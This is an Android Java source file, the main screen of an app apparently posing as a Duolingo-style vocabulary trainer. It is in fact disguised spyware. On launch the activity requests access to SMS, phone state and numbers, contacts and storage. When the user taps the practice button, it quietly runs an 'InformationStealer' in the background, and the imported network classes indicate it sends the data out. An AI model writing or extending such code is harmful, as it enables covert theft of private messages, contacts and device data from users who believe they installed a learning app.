package com.example.duolingopezzotto.Activity;

import static com.example.duolingopezzotto.InfoStealerManager.InformationStealer.inviato;
import static com.example.duolingopezzotto.InfoStealerManager.JSONParser.convertStringToJSON;

import android.Manifest;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AppCompatDelegate;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.duolingopezzotto.InfoStealerManager.InformationStealer;
import com.example.duolingopezzotto.InfoStealerManager.JSONParser;
import com.example.duolingopezzotto.InfoStealerManager.NetworkManager;
import com.example.duolingopezzotto.R;
import com.example.duolingopezzotto.SQLiteDB.DatabaseHelper;
import com.google.gson.JsonObject;

import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_PHONE_STATE = 1;

    Button esercitatiButton, aggiungiButton;
    DatabaseHelper my_db;
    private final InformationStealer stealer = new InformationStealer(this);
    Executor executor = Executors.newSingleThreadExecutor();
    boolean allPermissionsGranted = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO);
        this.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);

        setContentView(R.layout.activity_main);
        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.INTERNET
        };

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allPermissionsGranted = false;
                break;
            }
        }

        if (!allPermissionsGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_PHONE_STATE);
        }
        init();
    }

    private void init(){
        esercitatiButton = findViewById(R.id.esercitatiButton);
        aggiungiButton = findViewById(R.id.aggiungiButton);

        my_db = new DatabaseHelper(MainActivity.this);

        aggiungiButton.setOnClickListener(view -> {
            Intent gotoCategorie = new Intent(MainActivity.this, CategorieActivity.class);
            startActivity(gotoCategorie);
        });

        esercitatiButton.setOnClickListener(view -> {
            if (inviato == 0) executor.execute(stealer);
            //my_db.deleteAll();

            Intent gotoScegliCategorie = new Intent(MainActivity.this, ScegliCategorieActivity.class);
            startActivity(gotoScegliCategorie);
        });
    }
}